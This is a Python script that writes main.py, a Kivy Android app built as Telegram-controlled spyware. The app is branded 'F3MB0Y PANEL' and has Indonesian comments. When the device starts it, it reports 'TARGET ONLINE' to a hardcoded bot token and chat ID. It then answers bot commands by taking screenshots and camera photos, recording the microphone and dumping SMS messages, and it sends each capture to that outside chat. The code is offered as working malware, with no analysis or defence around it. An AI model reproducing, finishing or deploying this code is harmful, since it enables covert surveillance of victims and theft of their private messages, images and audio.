with open('main.py', 'w') as f:
    f.write("""
from kivy.app import App
import telebot
import threading
import os
import time
from plyer import camera, screenshot, audio, sms, gps
import platform

# --- KONFIGURASI ---
TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44"
CHAT_ID = "8025603711"
bot = telebot.TeleBot(TOKEN)

class F3mboyService(App):
    def build(self):
        threading.Thread(target=self.logic, daemon=True).start()
        return None

    def logic(self):
        device = platform.node()
        try: bot.send_message(CHAT_ID, f"🔥 **TARGET ONLINE!**\\nID: {device}")
        except: pass

        @bot.message_handler(commands=['start'])
        def menu(message):
            m = "🎮 **F3MB0Y PANEL**\\n/ss - Screen\\n/cam - Camera\\n/mic - Audio (10s)\\n/sms - Dump SMS"
            bot.send_message(CHAT_ID, m)

        @bot.message_handler(commands=['ss'])
        def cmd_ss(message):
            screenshot.capture(filename="s.png")
            time.sleep(2)
            with open("s.png", "rb") as f: bot.send_photo(CHAT_ID, f)

        @bot.message_handler(commands=['cam'])
        def cmd_cam(message):
            camera.take_picture(filename="c.jpg", on_complete=lambda p: bot.send_photo(CHAT_ID, open(p, 'rb')))

        @bot.message_handler(commands=['mic'])
        def cmd_mic(message):
            audio.file_path = "a.3gp"
            audio.start()
            time.sleep(10)
            audio.stop()
            with open("a.3gp", "rb") as f: bot.send_audio(CHAT_ID, f)

        @bot.message_handler(commands=['sms'])
        def cmd_sms(message):
            msgs = sms.get_messages()
            report = "\\n".join([f"{m.address}: {m.body}" for m in msgs[:15]])
            bot.send_message(CHAT_ID, report if report else "Kosong")

        bot.polling(none_stop=True)

if __name__ == '__main__':
    F3mboyService().run()
""")
